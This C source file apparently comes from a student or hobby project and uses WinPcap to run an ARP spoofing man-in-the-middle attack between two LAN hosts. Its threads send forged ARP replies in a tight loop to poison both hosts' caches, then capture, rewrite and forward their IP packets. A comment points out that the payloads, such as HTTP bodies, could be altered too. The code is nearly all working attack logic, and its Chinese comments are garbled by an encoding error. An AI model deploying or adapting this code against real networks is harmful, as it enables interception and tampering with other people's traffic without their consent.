#include "demo.h"

pcap_t *adhandle;

// S -> M -> D
// Src��Դ����
// Mid���м���
// Dst��Ŀ������
MacAddr sSrcMac, sMMac, sDstMac; IpAddr  sSrcIp, sMIp, sDstIp;

// ��ʼ��S��M��D��MAC�Լ�IP
void init() {
	// S: 10.1.30.6             74-27-ea-e3-ed-a9
	// M: 10.1.30.10			E0-DB-55-F4-F2-A6
	// D: 10.1.30.7             74-27-ea-e2-bc-a0
	sSrcMac.byte1 = 0x74; sSrcMac.byte2 = 0x27; sSrcMac.byte3 = 0xea;
	sSrcMac.byte4 = 0xe3; sSrcMac.byte5 = 0xed; sSrcMac.byte6 = 0xa9;

	sMMac.byte1 = 0xE0; sMMac.byte2 = 0xDB; sMMac.byte3 = 0x55;
	sMMac.byte4 = 0xF4; sMMac.byte5 = 0xF2; sMMac.byte6 = 0xA6;

	sDstMac.byte1 = 0x74; sDstMac.byte2 = 0x27; sDstMac.byte3 = 0xea;
	sDstMac.byte4 = 0xe2; sDstMac.byte5 = 0xbc; sDstMac.byte6 = 0xa0;

	sSrcIp.byte1 = 10; sSrcIp.byte2 = 1;
	sSrcIp.byte3 = 30; sSrcIp.byte4 = 6;

	sMIp.byte1 = 192; sMIp.byte2 = 168;
	sMIp.byte3 = 1; sMIp.byte4 = 4;

	sDstIp.byte1 = 192; sDstIp.byte2 = 168;
	sDstIp.byte3 = 1; sDstIp.byte4 = 3;

	sDstIp = sMIp = sSrcIp;
	sDstIp.byte4 = 7; sMIp.byte4 = 10;
	// S: 192.168.1.2 18:cf:5e:a4:0e:d5
	// M: 192.168.1.4 80:86:f2:cb:ee:4f
	// D: 192.168.1.3 0c:51:01:65:6c:5d
	/*sSrcMac.byte1 = 0x18; sSrcMac.byte2 = 0xcf; sSrcMac.byte3 = 0x5e;
	sSrcMac.byte4 = 0xa4; sSrcMac.byte5 = 0x0e; sSrcMac.byte6 = 0xd5;

	sMMac.byte1 = 0x80; sMMac.byte2 = 0x86; sMMac.byte3 = 0xf2;
	sMMac.byte4 = 0xcb; sMMac.byte5 = 0xee; sMMac.byte6 = 0x4f;

	sDstMac.byte1 = 0x0c; sDstMac.byte2 = 0x51; sDstMac.byte3 = 0x01;
	sDstMac.byte4 = 0x65; sDstMac.byte5 = 0x6c; sDstMac.byte6 = 0x5d;

	sSrcIp.byte1 = 192; sSrcIp.byte2 = 168;
	sSrcIp.byte3 = 1; sSrcIp.byte4 = 2;

	sMIp.byte1 = 192; sMIp.byte2 = 168;
	sMIp.byte3 = 1; sMIp.byte4 = 4;

	sDstIp.byte1 = 192; sDstIp.byte2 = 168;
	sDstIp.byte3 = 1; sDstIp.byte4 = 3;*/
}

// ·��ת���߳�
// ץȡIP���ݰ����޸���̫��ͷ����MAC��ַ����ת��
// �����Ҫ�����ݰ����ݽ����޸�Ҳ�ǿ��Եġ�eg. HTTP body
DWORD WINAPI loop1(LPVOID lpParameter){
	struct pcap_pkthdr *header;	// ��ͷ��ָ��
	const u_char *pkt_data;		// ������ָ��
	/* ��ʼ���� */
	int res;
	while ((res = pcap_next_ex(adhandle, &header, &pkt_data)) >= 0) {
		if (res == 0)
			/* ��ʱʱ�䵽 */
			continue;
		// ��ȡ��̫��Э��ͷ����Ϣ
		EthernetHeader * eHeader = (EthernetHeader *)(pkt_data);
		bool flag = false;
		// ѡȡIP���ݰ���0x8000��
		if (eHeader->nEthType == htons(0x0800)) {
			// ��ȡԴMAC��ַ
			int byte6 = eHeader->sSrcMac.byte6;

			// S: 192.168.1.2 18:cf:5e:a4:0e:d5
			// M: 192.168.1.4 80:86:f2:cb:ee:4f
			// D: 192.168.1.3 0c:51:01:65:6c:5d
			// S: 10.1.30.6             74-27-ea-e3-ed-a9
			// M: 10.1.30.10			E0-DB-55-F4-F2-A6
			// D: 10.1.30.7             74-27-ea-e2-bc-a0
			// �������S����
			if (byte6 == 0xa9) // S -> D
			{
				// �޸���̫��Э��ͷ����Ϣ
				// Ŀ������ΪDst������Դ����ΪMid����
				// �޸�Դ������Ϊ�˱���ԭ�е�arp��ƭ��
				flag = true;
				eHeader->sDstMac = sDstMac;
				eHeader->sSrcMac = sMMac;
			}
			else if (byte6 == 0xa0) { // �������D����
				// �޸���̫��Э��ͷ����Ϣ
				// Ŀ������ΪSrc������Դ����ΪMid����
				flag = true;
				eHeader->sDstMac = sSrcMac;
				eHeader->sSrcMac = sMMac;
			}
		}

		// �����޸ĵ����ݰ�
		if (flag) if (pcap_sendpacket(adhandle, // Adapter
			(unsigned char *)eHeader, // buffer with the packet
			header->len// size
			) != 0)
		{
			printf("�������ݰ�ʧ��\n");
		}
	}

	return 0;
}

// ARP��ƭ���ݰ�
DWORD WINAPI loop2(LPVOID lpParameter) {
	// fps ΪƵ�ʿ��Ʋ�����tt = 10000��һ�뷢��4200�������Ի���
	int fps = 10000;
	int tt = 0;	
	// ARP ��Ӧ����Src������Dst����
	EArpHeader ARPH = filtpacket(), ARPH2 = ARPH;

	/* ����ƭ��Դ������ */
	// Դ����
	ARPH.FrameHeader.sDstMac = sSrcMac;

	// Դ����
	ARPH.sDstMac = sSrcMac;
	ARPH.sDstIp = sSrcIp;

	// �м���
	ARPH.FrameHeader.sSrcMac = sMMac;

	// Ŀ������
	ARPH.sSrcMac = sMMac;
	ARPH.sSrcIp = sDstIp;

	/* ����ƭ��Ŀ�������� */

	// Ŀ������
	ARPH2.FrameHeader.sDstMac = sDstMac;
	// Ŀ������
	ARPH2.sDstMac = sMMac;
	ARPH2.sDstIp = sDstIp;
	
	// �м���
	ARPH2.FrameHeader.sSrcMac = sMMac;

	// Դ����
	ARPH2.sSrcMac = sMMac;
	ARPH2.sSrcIp = sSrcIp;

	while (true) {
		// Ƶ�ʿ��ƣ�
		if (tt == fps) {
			tt = 0;

			/* ��Src��������ARP��Ӧ����ƭ */
			if (pcap_sendpacket(adhandle, // Adapter
				(unsigned char *)&ARPH, // buffer with the packet
				sizeof(ARPH)// size
				) != 0)
			{
				printf("�������ݰ�ʧ��\n");
			}

			/* ��Dst��������ARP��Ӧ����ƭ */
			if (pcap_sendpacket(adhandle, // Adapter
				(unsigned char *)&ARPH2, // buffer with the packet
				sizeof(ARPH)// size
				) != 0)
			{
				printf("�������ݰ�ʧ��\n");
			}

		}
		tt++;
	}
	return 0;
}

int main() {
	pcap_if_t *alldevs;	// �豸
	pcap_if_t *d;		// �����豸
	int inum;			// ѡ��Adapter
	int i = 0;
	char errbuf[PCAP_ERRBUF_SIZE + 1];
	//char source[PCAP_ERRBUF_SIZE + 1];

	/*printf("Enter the device you want to list:\n"
	"rpcap://              ==> lists interfaces in the local machine\n"
	"rpcap://hostname:port ==> lists interfaces in a remote machine\n"
	"                          (rpcapd daemon must be up and running\n"
	"                           and it must accept 'null' authentication)\n"
	"file://foldername     ==> lists all pcap files in the give folder\n\n"
	"Enter your choice: ");

	fgets(source, PCAP_ERRBUF_SIZE, stdin);
	source[PCAP_ERRBUF_SIZE] = '\0';*/

	/* ��ýӿ��б� */
	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1) {
		fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
		exit(1);
	}


	/* ɨ���б���ӡÿһ�� */
	for (d = alldevs; d; d = d->next) {
		printf("%d.", ++i);
		ifprint(d);
	}

	if (!i) {
		printf("\nNo interface found! Make sure WinPacp is installed.\n");
		return -1;
	}

	/* ѡ���豸 */
	printf("Enter the interface number ��1-%d):", i);
	scanf("%d", &inum);

	if (inum < 1 || inum > i) {
		printf("\nInterface number out of range.\n");
		/* �ͷ��豸�б� */
		pcap_freealldevs(alldevs);
		return -1;
	}

	/* ��ת��ѡ�е������� */
	for (d = alldevs, i = 0; i < inum - 1; d = d->next, i++);

	/* ���豸 */
	if ((adhandle = pcap_open(d->name,          // �豸��
		65536,            // 65535��֤�ܲ��񵽲�ͬ������·���ϵ�ÿ�����ݰ���ȫ������
		PCAP_OPENFLAG_PROMISCUOUS,    // ����ģʽ�� see more(F12 in VS)
		1000,             // ��ȡ��ʱʱ��
		NULL,             // Զ�̻�����֤
		errbuf            // ���󻺳��
		)) == NULL) {
		fprintf(stderr, "\nUnable to open the adapter. %s is not supported by WinPcap\n", d->name);
		/* �ͷ��豸�б� */
		pcap_freealldevs(alldevs);
		return -1;
	}

	/* �ͷ��豸�б� */
	pcap_freealldevs(alldevs);

	/* ��ʼ��Ŀ��������Դ�����Լ��м��� */
	init();

	/* ����ת���߳� */
	HANDLE hThread1 = CreateThread(NULL, 0, loop1, NULL, 0, NULL);
	/* ����Arp��ƭ�߳� */
	HANDLE hThread2 = CreateThread(NULL, 0, loop2, NULL, 0, NULL);

	while (true) {}
	CloseHandle(hThread1);
	CloseHandle(hThread2);
	return 1;
}



//=====================================================================
//���APR���ݰ�
//======================================================================
EArpHeader filtpacket()
{
	EArpHeader ARPH; //���͵�ARP���ṹ
					 //�ȳ�ʼ������ARP��MAC��ַ

	ARPH.FrameHeader.nEthType = htons(0x0806);	//Э������ΪARP
												/* ArpHeader ���� */
	ARPH.nHardType = htons(0x0001);				//10M Ethernet
	ARPH.nProtoType = htons(0x0800);			//Э������ΪIP
	ARPH.nMacLen = 6;							//Ӳ����ַ����
	ARPH.nProtoLen = 4;							//IP��ַ����
	ARPH.nOpCode = htons(0x0002);				//Ӧ�����
	
	/* ArpPading ���� */
	for (int i = 0; i<18; i++) {
		ARPH.padding[i] = 0;
	}
	return ARPH;
};


/* ��ӡ���п�����Ϣ */
void ifprint(pcap_if_t *d) {
	pcap_addr_t *a;
	char ip6str[128];

	/* �豸��(Name) */
	printf("%s\n", d->name);

	/* �豸����(Description) */
	if (d->description)
		printf("\tDescription: %s\n", d->description);

	/* Loopback Address*/
	printf("\tLoopback: %s\n", (d->flags & PCAP_IF_LOOPBACK));

	/* IP addresses */
	for (a = d->addresses; a; a = a->next) {
		printf("\tAddress Family: #%d\n", a->addr->sa_family);

		switch (a->addr->sa_family)
		{
		case AF_INET:
			printf("\tAddress Family Name: AF_INET\n");
			if (a->addr)
				printf("\tAddress: %s\n", iptos(((struct sockaddr_in *)a->addr)->sin_addr.s_addr));
			if (a->netmask)
				printf("\tNetmask: %s\n", iptos(((struct sockaddr_in *)a->netmask)->sin_addr.s_addr));
			if (a->broadaddr)
				printf("\tBroadcast Address: %s\n", iptos(((struct sockaddr_in *)a->broadaddr)->sin_addr.s_addr));
			if (a->dstaddr)
				printf("\tDestination Address: %s\n", iptos(((struct sockaddr_in *)a->dstaddr)->sin_addr.s_addr));
			break;
		case AF_INET6:
			printf("\tAddress Family Name: AF_INET6\n");
			if (a->addr)
				printf("\tAddress: %s\n", ip6tos(a->addr, ip6str, sizeof(ip6str)));
			break;
		default:
			printf("\tAddress Family Name: Unknown\n");
			break;
		}
	}
	printf("\n");
}


/* ���������͵�IP��ַת�����ַ������͵� */
#define IPTOSBUFFERS 12
char * iptos(u_long in) {
	static char output[IPTOSBUFFERS][3 * 4 + 3 + 1];
	static short which;
	u_char *p;

	p = (u_char *)&in;
	which = (which + 1 == IPTOSBUFFERS ? 0 : which + 1);
	sprintf(output[which], "%d.%d.%d.%d", p[0], p[1], p[2], p[3]);
	return output[which];
}

char * ip6tos(struct sockaddr *sockaddr, char *address, int addrlen) {
	socklen_t sockaddrlen;

#ifdef WIN32
	sockaddrlen = sizeof(struct sockaddr_in6);
#else
	sockaddrlen = sizeof(struct sockaddr_storage);
#endif // WIN32

	if (getnameinfo(sockaddr,
		sockaddrlen,
		address,
		addrlen,
		NULL,
		0,
		NI_NUMERICHOST) != 0) address = NULL;

	return address;
}
